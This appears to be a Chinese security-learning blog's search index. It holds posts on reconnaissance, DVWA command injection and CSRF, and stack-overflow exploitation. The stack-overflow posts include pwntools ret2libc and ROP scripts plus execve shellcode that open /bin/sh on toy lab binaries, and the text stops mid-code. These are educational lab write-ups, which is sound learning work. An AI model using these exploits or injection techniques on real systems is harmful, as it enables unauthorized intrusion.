<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>网站渗透测试原理及详细过程</title>
      <link href="/2019/04/16/wang-zhan-shen-tou-ce-shi-yuan-li-ji-xiang-xi-guo-cheng/"/>
      <url>/2019/04/16/wang-zhan-shen-tou-ce-shi-yuan-li-ji-xiang-xi-guo-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="此处省略了原文的’零’，’一’，’二’，有兴趣的可以点文章最下面的原文链接查看，本文仅作为纯技术方面的个人总结。"><a href="#此处省略了原文的’零’，’一’，’二’，有兴趣的可以点文章最下面的原文链接查看，本文仅作为纯技术方面的个人总结。" class="headerlink" title="此处省略了原文的’零’，’一’，’二’，有兴趣的可以点文章最下面的原文链接查看，本文仅作为纯技术方面的个人总结。"></a>此处省略了原文的’零’，’一’，’二’，有兴趣的可以点文章最下面的原文链接查看，本文仅作为纯技术方面的个人总结。</h2><h2 id="一、信息收集（历来测试第一条，铁打的信息收集）"><a href="#一、信息收集（历来测试第一条，铁打的信息收集）" class="headerlink" title="一、信息收集（历来测试第一条，铁打的信息收集）"></a>一、信息收集（历来测试第一条，铁打的信息收集）</h2><h4 id="1-网络-公开-信息收集"><a href="#1-网络-公开-信息收集" class="headerlink" title="1.网络(公开)信息收集"></a>1.网络(公开)信息收集</h4><p>直接进行网络扫描不是这一步要干的事，循序渐进才对。先找一些公开的，个人认为会包含类似于“社工”的东西。详细的说，有google hacking（百度也行，意在大量获取周边的有用信息），whois查询，dns等。如果考虑进行社会工程学的话，这里还可以相应从邮件列表/新闻组中获取目标系统中一些边缘信息如内部员工帐号组成，身份识别方式，邮件联系地址等。</p><p>(1)使用whois查询目标域名的DNS服务器<br>(2)nslookup   [nslookup用于查询DNS的记录，查询域名解析是否正常]</p><blockquote><p>set type=all</p><p><domain><br>server <ns server><br>set q=all<br>ls -d <domain><br>   涉及的工具包括：Google,<a href="http://www.nosec.org/web/index.php?q=demon" target="_blank" rel="noopener">Demon</a>,<a href="http://www.webhosting.info/" target="_blank" rel="noopener">webhosting.info</a>,<a href="http://worm.ccert.edu.cn/GoogleHacking/Apollo/" target="_blank" rel="noopener">Apollo</a>,<a href="http://snakeoillabs.com/" target="_blank" rel="noopener">Athena</a>,<a href="http://snakeoillabs.com/downloads/GHDB.xml" target="_blank" rel="noopener">GHDB.XML</a>,<a href="http://uptime.netcraft.com/up/graph" target="_blank" rel="noopener">netcraft</a>,<a href="http://www.seologs.com/ip-domains.html" target="_blank" rel="noopener">seologs</a>。<br>(3)搜索引擎的常用语法<br>   <code>site</code>:用于搜索指定的站点关键字。比如<code>site:www.nosec.org</code>，比如用<code>site:nosec.org</code>搜索该域名下的所有子域名的页面，比如用<code>site:org.cn</code>搜索中国政府部门的网站。</domain></ns></domain></p></blockquote><h4 id="2-目标系统信息收集（目前不太懂。。。）"><a href="#2-目标系统信息收集（目前不太懂。。。）" class="headerlink" title="2.目标系统信息收集（目前不太懂。。。）"></a>2.目标系统信息收集（目前不太懂。。。）</h4><p>通过上面一步，我们应当可以简单的描绘出目标系统的网络结构，如公司网络所在区域，子公司IP地址分布，VPN接入地址等。这里特别要注意一些比较偏门的HOST名称地址，如一些<code>backup</code>开头或者<code>temp</code>开关的域名很可能就是一台备份服务器，其安全性很可能做的不够。<br>从获取的地址列表中进行系统判断，了解其组织架构及操作系统使用情况。最常用的方法的是目标所有IP网段扫描。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我自己关于安全的一点想法(持续更新)</title>
      <link href="/2019/04/14/wo-zi-ji-guan-yu-an-quan-de-yi-dian-xiang-fa-chi-xu-geng-xin/"/>
      <url>/2019/04/14/wo-zi-ji-guan-yu-an-quan-de-yi-dian-xiang-fa-chi-xu-geng-xin/</url>
      
        <content type="html"><![CDATA[<a id="more"></a>        <p>1.好像是道哥在《白帽子……（最经典那本）》里说的，安全的前提是信任。没有绝对的安全，一切的安全都建立在信任的基础上，比如我们信任使用账号的正是他本人，然后我们把信息给他看，如果这个信任条件不成立，那就不是安全的。</p><p>2.我们的Urahara大哥说的，在我们刚学sqli的时候，他说大多数漏洞的本质就是能操控用户自己能修改的东西，比如XSS，SQLi就是通过拼接或者什么的，我们通过改变自己所能改变操控的东西对内部，后台，产生了不愿意见到或是意料之外的影响。</p><p>3.我们的WeaponX大哥说的，漏洞这种东西发现了不重要，重要的是可不可以利用，二进制安全方面的漏洞，能否影响程序走向，进程，才是重要的。</p>]]></content>
      
      
      <categories>
          
          <category> 杂记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人感悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA学习(low)</title>
      <link href="/2019/04/14/dvwa-xue-xi-low/"/>
      <url>/2019/04/14/dvwa-xue-xi-low/</url>
      
        <content type="html"><![CDATA[<a id="more"></a>        <h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>暴力破解，很简单，burp加载一下常用的用户名密码字典，跑就完了。</p><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>命令注入，根据我这篇文章的第二条<a href="https://windq08.github.io/2019/04/14/wo-zi-ji-guan-yu-an-quan-de-yi-dian-xiang-fa-chi-xu-geng-xin/" title="我自己对安全的一点想法">（我就是“这篇文章”）</a>，其实命令注入，就是在一个注入点正常所允许的服务范围之外加点额外的东西。比如本题，提示是<code>Enter an IP address:</code>，我们输入一个IP后发现其实是执行了<code>ping</code>命令的回显，那么首先想到的是在完成<code>ping</code>的指令后我们还可以通过命令拼接让它再执行一些别的命令。<br><img src="/2019/04/14/dvwa-xue-xi-low/1.png" alt="命令注入"><br><strong>然后，让我们来学习一下常见的命令拼接的手段！！！！我研究好半天呢！！！</strong></p><h3 id><a href="#" class="headerlink" title="|"></a><code>|</code></h3><p>管道命令<br>例：<code>dir . /s/a | find /c &quot;.exe&quot;</code> 先执行<code>dir</code>命令，然后对输出结果（<code>stdout</code>）执行<code>find</code>命令（输出当前文件夹及所有子文件夹里的.exe文件的个数）。</p><h3 id="-1"><a href="#-1" class="headerlink" title="||"></a><code>||</code></h3><p>顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令。</p><h3 id="amp"><a href="#amp" class="headerlink" title="&amp; / ;"></a><code>&amp; / ;</code></h3><p>bat中是使用<code>&amp;</code>,bash中使用<code>;</code><br>表示简单的拼接，前后命令语句没有制约关系。</p><h3 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a><code>&amp;&amp;</code></h3><p>先执行前面的命令，后执行后执行后面的命令。</p><p><em>注：记得在符号两侧加上空格。</em></p><p>看完了这个，low级别的命令注入就很简单了，简单的命令拼接就可以搞定。</p><p>附：<a href="https://www.cnblogs.com/accumulater/p/7110811.html" target="_blank" rel="noopener">Windows常用命令大全</a></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF是啥呢，简而言之就是用另一个人的身份做不应该自己做的事情。比如有一个用户S，我用自己的账号找到了一个网站上修改个人信息的链接，我截住这个发出请求的数据包，改变其中的某些参数，比如把自己的ID改成用户S的ID，诸如此类，然后把这个数据包在Burp中封成CSRF用链接，再把这个链接发给用户S，他若点开了，就是用他的身份做了这件事。</p><p>专业解释（上面的是领会精神）：<code>CSRF</code>，全称<code>Cross-site request forgery</code>，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。在2013年发布的新版OWASP Top 10中，CSRF排名第8。</p><p>然后让我们来看一下这道题<br><img src="/2019/04/14/dvwa-xue-xi-low/2.png" alt="CSRF"><br>很简单，输入密码，确认密码，就可以完成了，没有做任何防护。我们来看一下数据包。<br><img src="/2019/04/14/dvwa-xue-xi-low/3.png" alt="CSRF"><br>可以看出来这个请求的地址是</p><pre class=" language-bash"><code class="language-bash">GET /DVWA-master/vulnerabilities/csrf/?password_new<span class="token operator">=</span>123123<span class="token operator">&amp;</span>password_conf<span class="token operator">=</span>123123<span class="token operator">&amp;</span>Change<span class="token operator">=</span>Change HTTP/1.1</code></pre><p>谁要是点了这个，密码就会被改成123123了（当然是在理想情况下）。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web环境练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出（三）</title>
      <link href="/2019/04/13/zhan-yi-chu-san/"/>
      <url>/2019/04/13/zhan-yi-chu-san/</url>
      
        <content type="html"><![CDATA[<a id="more"></a>        <h2 id="一、了解一下libc"><a href="#一、了解一下libc" class="headerlink" title="一、了解一下libc"></a>一、了解一下libc</h2><p>　　libc动态链接库中的函数被广泛使用，所以有大概率可以在内存中找到libc动态库。该库内包含了一些系统级的函数，比如<code>system()</code>，所以可以尝试用这些系统级的函数取得控制权。再比如，这样的参数有可能是需要参数的，比如我们调用<code>system()</code>打开<code>/bin/sh</code>（即<code>system(&quot;/bin/sh&quot;)</code>），就可以执行一个shell了，所以可操控的数据里也要考虑这些重要参数。<br>　　还有一种东西叫ASLR，即地址随机化。如果打开了这种保护机制，那么每次运行时动态库的起始地址都会发生变化，即无法确定库里那些函数的绝对地址（除非你是天选之子一蒙一蒙一个准。。。那兴许还有救）。我们复现都是在关闭了ASLR的条件下。可通过调试工具获取<code>system()</code>的地址，动态库在内存中的起始地址，函数相对于起始地址的偏移量和函数的绝对地址。</p><h2 id="二、看一下代码"><a href="#二、看一下代码" class="headerlink" title="二、看一下代码"></a>二、看一下代码</h2><h3 id="2-1-代码"><a href="#2-1-代码" class="headerlink" title="2.1 代码"></a>2.1 代码</h3><p><strong>源程序</strong></p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>s<span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>脚本</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./vul"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./vul"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>payload  <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">44</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"vul"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#再次执行vul，造成第二次缓冲区溢出</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>ret <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>read_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token keyword">print</span> hex<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>read_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>system_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>binsh_offset <span class="token operator">=</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>base <span class="token operator">=</span> read_addr <span class="token operator">-</span> read_offsetsystem_addr <span class="token operator">=</span> base <span class="token operator">+</span> system_offsetbinsh_addr <span class="token operator">=</span> base <span class="token operator">+</span> binsh_offsetpayload2  <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">44</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="2-2-过程"><a href="#2-2-过程" class="headerlink" title="2.2 过程"></a>2.2 过程</h3><h4 id="2-2-1-第一次"><a href="#2-2-1-第一次" class="headerlink" title="2.2.1 第一次"></a>2.2.1 第一次</h4><p>在libc中可以找到<code>system()</code>和<code>/bin/sh</code>的地址(其实是相对于动态库起始地址的偏移量），利用第一次缓冲区溢出泄露地址，<code>base + read_offset = read_addr</code>，可以得到<code>read_offset</code>（偏移量），然后找出<code>read_addr</code>的地址，即</p><pre class=" language-python"><code class="language-python">base <span class="token operator">=</span> read_addr <span class="token operator">-</span> read_offsetsystem_addr <span class="token operator">=</span> base <span class="token operator">+</span> system_offset</code></pre><h4 id="2-2-2-第二次"><a href="#2-2-2-第二次" class="headerlink" title="2.2.2 第二次"></a>2.2.2 第二次</h4><p>在第二次缓冲区溢出时，程序会新开一个<code>system</code>进程，且需要调用的参数<code>/bin/sh</code>在栈中。</p><pre><code>payload1：padding + address of write_plt + address of vul + address of parameter write()payload2：padding + address of system() + address of dead + address of /bin/sh</code></pre><h2 id="三、ROP技术-Return-Oriented-Programming"><a href="#三、ROP技术-Return-Oriented-Programming" class="headerlink" title="三、ROP技术( Return Oriented Programming )"></a>三、ROP技术( Return Oriented Programming )</h2><p>　　在64位程序中局部变量存储在栈中，函数的参数存储在寄存器中，无法通过代码来修改寄存器中的参数，但是可以通过指令去修改。</p><p>　　在内存中确定某段指令的地址，并用其覆盖返回地址。但是有时候目标函数在内存中无法找到特定的函数可以适配，这时需要在内存中寻找多个指令片段，拼凑处一系列操作。可以使用rp++来搜索以ret结尾的指令片段。</p><pre class=" language-bash"><code class="language-bash">rp++ -f vul64 -r 5</code></pre><p><img src="/2019/04/13/zhan-yi-chu-san/1.jpg" alt="参考示意图"></p><h3 id="3-1-代码"><a href="#3-1-代码" class="headerlink" title="3.1 代码"></a>3.1 代码</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./vul64"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./vul64"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc64.so.6"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = remote('127.0.0.1', 10001)</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span><span class="token number">0x0400623</span> <span class="token comment" spellcheck="true">#:pop rdi ; ret  ;  (1 found)</span>pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x00400621</span> <span class="token comment" spellcheck="true">#: pop rsi ; pop r15 ; ret  ;  (1 found)</span>payload  <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">40</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xFFFFFFFFFFFFFFFF</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"vul"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>ret <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>read_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>read_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>system_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>binsh_offset <span class="token operator">=</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>base <span class="token operator">=</span> read_addr <span class="token operator">-</span> read_offsetsystem_addr <span class="token operator">=</span> base <span class="token operator">+</span> system_offsetbinsh_addr <span class="token operator">=</span> base <span class="token operator">+</span> binsh_offsetpayload  <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">40</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>　　利用两次溢出来执行<code>system(&quot;/bin/sh&quot;)</code></p><p><em>参考：<a href="https://www.chongming.club/2019/03/09/Buffer-overflow/#more" target="_blank" rel="noopener">https://www.chongming.club/2019/03/09/Buffer-overflow/#more</a></em><br><em>P.S.啊我好疲惫先让我偷个懒等我有空我再往上填么么哒</em></p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出（二）</title>
      <link href="/2019/03/27/zhan-yi-chu-er/"/>
      <url>/2019/03/27/zhan-yi-chu-er/</url>
      
        <content type="html"><![CDATA[<h5 id="这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。"><a href="#这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。" class="headerlink" title="这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。"></a>这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。</h5><a id="more"></a><p>　　源程序代码如下：     </p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>　　自己填塞恶意代码，容易“跑”，我们需要一块稳定的，持续可用的代码段来供我们使用。这时候首先想到的是<code>bss</code>段，因为<code>bss</code>段通常用来存放程序中未初始化的全局变量，且可读可写。变量一般分为全局变量和局部变量，局部变量的存活时间较短，函数执行完就自动释放了，全局变量则不同，可以被程序内所有的对象或函数引用，相对来说更加稳定，比较适合存放一段恶意代码。<br>　　<code>bss</code>段可读可写不可执行，因此如果我们想进行实验，需要关掉栈保护和数据执行保护，使得<code>bss</code>段的代码变得可以执行。编译命令如下：    </p><pre class=" language-bash"><code class="language-bash">gcc -fno-stack-protector -z execstack -o xxxx xxxx.c</code></pre><p>　　<code>-fno-stack-protector</code>用于关掉栈保护，<code>-z execstack</code>用于关掉数据可执行保护（DEP）。攻击脚本代码如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./vul"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./vul"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = remote('127.0.0.1', 10001)       #远程</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>payload  <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">44</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x0804a040</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x0804a040</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> <span class="token string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出（一）</title>
      <link href="/2019/03/25/zhan-yi-chu-yi/"/>
      <url>/2019/03/25/zhan-yi-chu-yi/</url>
      
        <content type="html"><![CDATA[<h5 id="开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。"><a href="#开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。" class="headerlink" title="开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。"></a>开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。</h5><a id="more"></a>        <h2 id="一、栈溢出的概念"><a href="#一、栈溢出的概念" class="headerlink" title="一、栈溢出的概念"></a>一、栈溢出的概念</h2><p>　　首先我们要知道在计算机内部，一块内存的地址是连续的，是上下连贯的。其次，程序在运行过程中，为了临时存取数据的需要，一般都要分配一些内存空间，通常称这些空间为缓冲区，（操作系统所使用的缓冲区，又被称为“堆栈”，在各个操作进程之间，指令会被临时储存在“堆栈”当中。）当我们定义的数据所需要占用的内存超过了栈的大小时，就会发生栈溢出。   </p><p>　　举个例子，比如我们定义一个C程序的函数：    </p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>    　　<span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    　　<span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>　　当我们定义了一个32字节的字符串s时，内存中会申请一个32字节的空间来保存这个字符串的数据，但<code>read</code>函数的读取字长参数是128[<code>read</code>函数的三个参数分别是<code>fd</code>（0标准输入，1标准输出），读取起始地址，读取字长]，明显超过了数组的字节长度，32位以后的数据就会“涌出”预留空间，缓冲区内其他部分“进发”，这就是栈溢出。　　　　　　</p><h2 id="二、简单的利用"><a href="#二、简单的利用" class="headerlink" title="二、简单的利用　"></a>二、简单的利用　</h2><p>　　任何语言的代码最后都可以转成汇编语言这种“通用语言”。如果用汇编语言去看一个程序的代码，在一个函数调用了另一段函数且运行结束后，会出现<code>ret</code>指令，<code>ret</code>指令会返回到调用者函数（<code>ret</code>指令做的事是：把当前栈顶元素写入<code>rip</code>寄存器），即执行调用者函数Ａ→调用执行某函数Ｂ→Ｂ结束后ret跳转继续执行调用者函数A。如果能够修改存储的ret指令操作的地址值，那就可以操纵这个函数执行完毕后跳转的位置，再如果，我们能将这个地址值修改成一段恶意代码的地址，那么它将会跳转到这段恶意代码的地址上并执行它（当然前提是栈是可执行的，如果开启了NX保护可能就不行了）。</p><p>　　举个简单的例子，有如下Ｃ语言代码：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span>　　　　　</span><span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span>　　　　　<span class="token punctuation">{</span>　　<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// "/bin/sh"可执行shell脚本，即执行系统命令</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span>　　　　<span class="token punctuation">{</span>　　<span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>　　<span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//从数组s起始地址开始向后写入128字节　　　　</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token 